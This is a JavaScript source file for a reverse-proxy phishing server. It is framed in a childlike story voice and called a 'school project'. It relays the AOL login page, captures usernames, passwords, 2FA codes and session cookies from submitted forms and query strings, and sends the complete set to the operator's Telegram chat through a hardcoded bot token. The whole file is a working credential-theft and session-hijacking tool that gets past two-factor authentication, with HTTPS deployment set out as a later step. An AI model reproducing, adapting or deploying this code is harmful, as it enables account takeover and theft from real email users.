// Import all the special tools Sam needs
const express = require('express'); // For building the server
const { createProxyMiddleware } = require('http-proxy-middleware'); // The magic proxy tool
const bodyParser = require('body-parser'); // To read messages from Smith
const TelegramBot = require('node-telegram-bot-api'); // To send secret notes to yourself
const https = require('https'); // For secure connections (later)
const fs = require('fs'); // To read files (for security later)

// ============================================
// CONFIGURATION - PUT YOUR DETAILS HERE
// ============================================

// 1. Your secret code for the Telegram Bot (get this from BotFather)
const TELEGRAM_TOKEN = '8257609367:AAGC6iMZTzOsJEYAlqrFGckKN7T-1pMAS2g'; // <<<--- PUT YOUR TOKEN HERE!

// 2. Your Telegram Chat ID (where you want to receive the secret notes)
const CHAT_ID = '7837944828'; // <<<--- PUT YOUR CHAT ID HERE!

// 3. The real website Sam is helping you visit (e.g., ISP email provider)
//    Make SURE this is the exact base address. For ISP emails, using a trailing slash is often good.
//    Example for Cox Business: 'https://webmail.coxbusiness.com/'
//    Example for your school project: 'https://www.myschoolfinalproject.com/'
const TARGET_URL_BASE = 'https://login.aol.com/'; // <<<--- CHANGE THIS TO THE BASE URL OF THE ISP EMAIL PROVIDER YOU ARE TESTING!

// 4. What "room number" (port) Sam's server will listen on. We'll use 3000 for now.
const PORT = 3000;

// ============================================
// SAM'S SETUP
// ============================================

const app = express(); // This creates Sam's server application
// This is how Sam talks to the Telegram Bot. 'polling: false' means Sam won't constantly ask Telegram if there are new messages.
const bot = new TelegramBot(TELEGRAM_TOKEN, {polling: false});

// Sam's special notebook to remember things.
let capturedData = {
  username: null,
  password: null,
  twofaCode: null, // For the 2-factor authentication code
  sessionToken: null, // The "golden ticket" that proves you're logged in
  stage: 0, // To keep track of which step of the login Smith is on
  startTime: new Date().toISOString() // When Sam started working
};

// ============================================
// STEP 1: SAM READS WHAT SMITH SENDS
// ============================================

// These lines tell Sam to be ready to read messages that are sent in different formats.
app.use(bodyParser.json()); // For messages that look like organized lists (JSON)
app.use(bodyParser.urlencoded({ extended: true })); // For messages that look like form data

// This is a special rule for Sam's server. It will look at *every* message Smith sends.
app.use((req, res, next) => {
  // First, Sam writes down what Smith is doing.
  console.log(`[${req.method}] ${req.url}`); // Logs the type of request (GET, POST) and the page Smith is asking for.

  // If Smith is sending information (like filling out a form - a POST request)
  if (req.method === 'POST') {
    console.log('🚨 POST Request received!');

    // Check for data in the request body first (the usual way)
    if (req.body && Object.keys(req.body).length > 0) {
      console.log('📨 Data from Smith (in req.body):', req.body);

      // Stage 1: Capture username/email from body
      if (req.body.username || req.body.email || req.body.user) {
        capturedData.username = req.body.username || req.body.email || req.body.user;
        capturedData.stage = 1;
        console.log('✅ Stage 1: Username captured');
      }
      // Stage 2: Capture password from body
      if (req.body.password || req.body.passwd || req.body.pass) {
        capturedData.password = req.body.password || req.body.passwd || req.body.pass;
        capturedData.stage = 2;
        console.log('✅ Stage 2: Password captured');
      }
      // Stage 3: Capture 2FA code from body
      if (req.body.code || req.body.otp || req.body.twofa || req.body.verificationCode) {
        capturedData.twofaCode = req.body.code || req.body.otp || req.body.twofa || req.body.verificationCode;
        capturedData.stage = 3;
        console.log('✅ Stage 3: 2FA code captured');
      }
    } else {
      console.log('⚠️ No data found in req.body for this POST request. Checking URL query parameters...');
      
      // Now, check for data in the URL's query parameters (like ?username=test&password=123)
      if (req.query) {
          console.log('🔍 Query Params found:', req.query);

          // Stage 1: Capture username/email from query params
          if (req.query.username || req.query.email || req.query.user) {
              capturedData.username = req.query.username || req.query.email || req.query.user;
              capturedData.stage = 1;
              console.log('✅ Stage 1: Username captured from query params');
          }
          // Stage 2: Capture password from query params
          if (req.query.password || req.query.passwd || req.query.pass) {
              capturedData.password = req.query.password || req.query.passwd || req.query.pass;
              capturedData.stage = 2;
              console.log('✅ Stage 2: Password captured from query params');
          }
          // Stage 3: Capture 2FA code from query params
          if (req.query.code || req.query.otp || req.query.twofa || req.query.verificationCode) {
              capturedData.twofaCode = req.query.code || req.query.otp || req.query.twofa || req.query.verificationCode;
              capturedData.stage = 3;
              console.log('✅ Stage 3: 2FA code captured from query params');
          }
      }
    }
  }

  // After checking the message, Sam lets the next instruction run.
  next();
});

// ============================================
// STEP 2: THE MAGIC PROXY MIRROR
// ============================================

const proxy = createProxyMiddleware({
  // Use the base URL for the target. The middleware will append the request path.
  target: TARGET_URL_BASE,
  changeOrigin: true,       // Helps make the request look like it's coming from the target.
  secure: false,            // For testing, ignore certificate issues.
  ws: true,                 // Support WebSockets.
  followRedirects: true,    // Automatically handle redirects.

  // This part is for when Sam is sending a request FROM Smith TO the school website.
  onProxyReq: (proxyReq, req, res) => {
    // Add headers to help the target server understand the origin.
    proxyReq.setHeader('X-Forwarded-For', req.ip);
    proxyReq.setHeader('X-Forwarded-Proto', req.protocol);
    proxyReq.setHeader('X-Real-IP', req.ip);
    console.log('➡️  Forwarding to school:', req.url); // Log the request being forwarded.
  },

  // This part is for when Sam is getting a response FROM the school website BACK to Smith.
  onProxyRes: (proxyRes, req, res) => {
    console.log('⬅️  Response from school:', proxyRes.statusCode, req.url); // Log the response status code.

    // Check if the response is a redirect (status code 3xx)
    if (proxyRes.statusCode >= 300 && proxyRes.statusCode < 400) {
      const location = proxyRes.headers['location'];
      if (location) {
        console.log(`🔄 Redirect detected: ${location}`);
        // `followRedirects: true` should handle rewriting the Location header to go through the proxy.
      }
    }

    // Look for session cookies (the Golden Ticket!)
    const cookies = proxyRes.headers['set-cookie'];

    if (cookies) {
      console.log('🍪 Cookies found:', cookies); // Log any cookies found.

      // Try to find a cookie that looks like a session token.
      const sessionCookie = cookies.find(c =>
        c.toLowerCase().includes('session') ||
        c.toLowerCase().includes('token') ||
        c.toLowerCase().includes('auth') ||
        c.length > 50 // Session tokens are usually long.
      );

      // If we found a session token AND we have captured Smith's username...
      if (sessionCookie && capturedData.username) {
        capturedData.sessionToken = sessionCookie; // Store the session token.
        capturedData.stage = 4; // Mark login as complete.

        console.log('🎉 COMPLETE LOGIN CAPTURED!');
        console.log('Username:', capturedData.username);
        console.log('Password:', capturedData.password);
        console.log('2FA:', capturedData.twofaCode);
        console.log('Session:', capturedData.sessionToken.substring(0, 50) + '...'); // Log a snippet of the token.
        
        // ============================================
        // STEP 3: SEND THE SECRET NOTE TO TELEGRAM!
        // ============================================

        const message = `🎉 *CAPTURE COMPLETE!*\n\n` +
          `👤 *Username:* \`${capturedData.username}\`\n` +
          `🔑 *Password:* \`${capturedData.password}\`\n` +
          `🔢 *2FA Code:* \`${capturedData.twofaCode || 'N/A'}\`\n\n` +
          `🍪 *Session Token:* \`\`\`\n${capturedData.sessionToken}\n\`\`\`\n\n` +
          `⏰ *Time:* ${new Date().toLocaleString()}\n` +
          `🌐 *Target:* ${TARGET_URL_BASE}\n\n` +
          `_Sam has successfully intercepted the session!_`;
        
        bot.sendMessage(CHAT_ID, message, {parse_mode: 'Markdown'})
          .then(() => console.log('📱 ✅ Sent to Telegram!'))
          .catch(err => console.log('❌ Telegram error:', err.message));
      }
    }
  },

  // If something goes wrong during the proxy process.
  onError: (err, req, res) => {
    console.error('❌ Proxy error:', err.message); // Log the proxy error.
    // Prevent a loop if the error is trying to proxy itself.
    if (req.headers.host && req.headers.host.includes('localhost:3000')) {
        console.error('Loop detected: Request seems to be trying to proxy itself.');
        res.status(500).send('Sam encountered an error: Proxy loop detected.');
    } else {
        res.status(500).send('Sam encountered an error: ' + err.message);
    }
  }
});

// Use the proxy for all incoming requests.
app.use('/', proxy);

// ============================================
// STEP 4: START SAM'S SERVER
// ============================================

// This starts Sam's server so it can listen for Smith's requests.
app.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════════════════╗
║                                                ║
║   🎭 SAM'S REVERSE PROXY IS RUNNING! 🎭       ║
║                                                ║
║   Target Website: ${TARGET_URL_BASE}    ║
║   Sam's Proxy Address:  http://localhost:${PORT}              ║
║                                                ║
║   Tell Smith to visit:                         ║
║   http://localhost:${PORT}                      ║
║                                                ║
╚════════════════════════════════════════════════╝
  `);
});

// ============================================
// HTTPS VERSION (For Deployment - Later!)
// ============================================
/*
const sslOptions = {
  key: fs.readFileSync('path/to/your/private-key.pem'), // <<<--- Replace with your key file path
  cert: fs.readFileSync('path/to/your/certificate.pem') // <<<--- Replace with your certificate file path
};

https.createServer(sslOptions, app).listen(443, () => {
  console.log('🔒 Sam is running on HTTPS port 443!');
});
*/
